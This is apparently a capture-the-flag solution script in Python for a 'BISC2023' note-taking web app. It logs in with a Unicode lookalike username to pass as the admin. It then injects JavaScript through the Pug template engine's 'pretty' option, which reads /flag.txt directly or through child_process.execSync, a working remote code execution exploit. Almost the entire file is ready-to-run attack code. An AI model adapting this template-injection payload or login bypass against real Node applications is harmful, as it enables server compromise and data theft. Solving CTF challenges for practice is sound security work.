import argparse
import re
import sys
import requests
def extract_flag(html: str):
    pats = [
        r"[A-Z0-9_]{3,}\{[^{}\n]{0,500}\}",
        r"[A-Za-z0-9_]{3,}\{[^{}\n]{0,500}\}",
        r"BISC2023\{[^{}\n]{0,500}\}",
    ]
    for pat in pats:
        m = re.search(pat, html)
        if m:
            return m.group(0)
    return None

def main():
    ap = argparse.ArgumentParser(description="Pug pretty injection exploit (Python)")
    ap.add_argument("--url", default="http://127.0.0.1", help="Base URL (default: http://127.0.0.1)")
    ap.add_argument("--title", default="ssti", help="Note title (default: ssti)")
    ap.add_argument("--username", default="B\u0131SC2023", help="Login username (default: BıSC2023)")
    ap.add_argument("--password", default="TeamH4C", help="Login password (default: TeamH4C)")
    ap.add_argument("--method", choices=["fs", "child"], default="fs",
                    help="Read flag via 'fs' or 'child' process (default: fs)")
    ap.add_argument("--crash-test", action="store_true",
                    help="Inject a crash-on-compile payload to verify codegen injection")
    args = ap.parse_args()

    base = args.url.rstrip("/")
    s = requests.Session()

    r = s.post(f"{base}/login", data={"id": args.username, "pw": args.password}, timeout=10)
    r.raise_for_status()

    r = s.get(f"{base}/", timeout=10)
    if "Login : BISC2023" not in r.text:
        print("[!] Not admin. Make sure you used a valid bypass and correct password.", file=sys.stderr)
        sys.exit(2)
    print("[+] Logged in as BISC2023")
    r = s.post(f"{base}/write", data={"title": args.title, "content": "seed"}, timeout=10)
    r.raise_for_status()
    print(f"[+] Seed note '{args.title}' created/ensured")
    if args.crash_test:
        pretty_payload = "');throw new Error(\"PWN_PRETTY\");var _=('"
        print("[*] Using crash-on-compile payload (expect 500 on first /note render).")
    else:
        if args.method == "fs":
            pretty_payload = (
                "');"
                "pug_html=process.mainModule.constructor._load(\"fs\").readFileSync(\"/flag.txt\",\"utf8\");"
                "return pug_html;//'"
            )
        else: 
            pretty_payload = (
                "');"
                "pug_html=process.mainModule.constructor._load(\"child_process\").execSync(\"cat /flag.txt\").toString();"
                "return pug_html;//'"
            )
        print(f"[*] Injecting '{args.method}' payload via pretty")

    r = s.post(
        f"{base}/edit",
        data={
            "title": args.title,
            "b_title": args.title,
            "content": "anything",
            "pretty": pretty_payload,
        },
        timeout=10,
    )
    r.raise_for_status()
    print("[+] Payload injected (POST /edit OK)")
    r = s.get(f"{base}/note", params={"title": args.title}, timeout=10)
    html = r.text

    if args.crash_test:
        print(html)
        if "PWN_PRETTY" in html:
            print("[+] Crash marker seen -> compile-time injection confirmed.")
        else:
            print("[?] No crash marker. If template compiled before injection, restart the app and re-run.",
                  file=sys.stderr)
        return

    flag = extract_flag(html)
    if flag:
        print(f"[+] FLAG: {flag}")
    else:
        print(html)


if __name__ == "__main__":
    try:
        main()
    except requests.RequestException as e:
        print(f"[!] HTTP error: {e}", file=sys.stderr)
        sys.exit(1)

# Run: python3 <filename.py> --url "http://127.0.0.1/" --title ssti
